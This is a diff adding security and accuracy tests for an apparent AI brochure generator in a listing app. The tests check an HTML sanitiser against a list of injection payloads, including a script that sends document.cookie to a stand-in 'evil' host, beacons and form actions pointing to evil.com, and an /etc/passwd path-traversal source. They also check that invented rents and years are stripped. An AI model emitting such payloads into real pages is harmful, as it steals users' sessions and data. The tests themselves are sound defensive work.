@@ -577,3 +577,42 @@ main().catch(async (err) => {
   check('bySlug resolves an aliased slug', /slugAliases \|\| \[\]\)\.includes\(slug\)/.test(storeSrc));
   check('slugify still de-duplicates', typeof slugify === 'function' && typeof listings.bySlug === 'function');
 }
+
+// --- brochure: model output is untrusted ------------------------------------
+{
+  const { _internals, BROCHURE_STYLES } = await import('../server/agents/brochure-agent.js');
+  const { collectFacts } = await import('../server/facts.js');
+  const { sanitiseHtml, enforceFacts } = _internals;
+
+  /* Broker notes, photo filenames and lead text all reach this prompt, and the
+     response is rendered in the broker's browser. Treat it as untrusted input. */
+  const attacks = [
+    ['<script>fetch("//evil/"+document.cookie)</script>', /evil|<script/i],
+    ['<div onclick="x()">hi</div>', /onclick/i],
+    ['<a href="javascript:alert(1)">x</a>', /javascript:/i],
+    ['<img src="https://evil.com/beacon.gif">', /evil\.com/i],
+    ['<style>@import url(https://evil.com/x.css);</style>', /evil\.com/i],
+    ['<style>body{background:url(https://evil.com/x)}</style>', /evil\.com/i],
+    ['<iframe src="https://evil.com"></iframe>', /<iframe|evil/i],
+    ['<form action="https://evil.com"></form>', /<form|evil/i],
+    ['<img src="/uploads/../../etc/passwd">', /\.\./],
+  ];
+  let leaks = 0;
+  for (const [input, forbidden] of attacks) {
+    if (forbidden.test(sanitiseHtml(input).html)) leaks += 1;
+  }
+  check('brochure sanitiser blocks scripts, beacons and exfiltration', leaks === 0);
+  check('brochure sanitiser keeps our own images',
+    sanitiseHtml('<img src="/uploads/img_a1.jpg">').html.includes('/uploads/img_a1.jpg'));
+
+  /* A brochure is the document a broker hands a client. A number the broker
+     never entered must not appear on it, no matter what the model wrote. */
+  const listing = { name: 'X', address: '400 Riverview Dr', specs: [{ label: 'Available', value: '24,000 SF' }] };
+  const facts = collectFacts(listing, null);
+  const out = enforceFacts('<p>24,000 SF available. Asking $18.50 NNN, built in 1998.</p>', facts).html;
+  check('an invented rent never reaches the brochure', !/18\.50/.test(out));
+  check('an invented year never reaches the brochure', !/1998/.test(out));
+  check('the broker\'s own number survives', /24,000 SF/.test(out));
+  check('a stripped sentence does not leave a broken one', !/Asking\s+built/.test(out));
+  check('brochure styles are offered', BROCHURE_STYLES.length >= 3);
+}
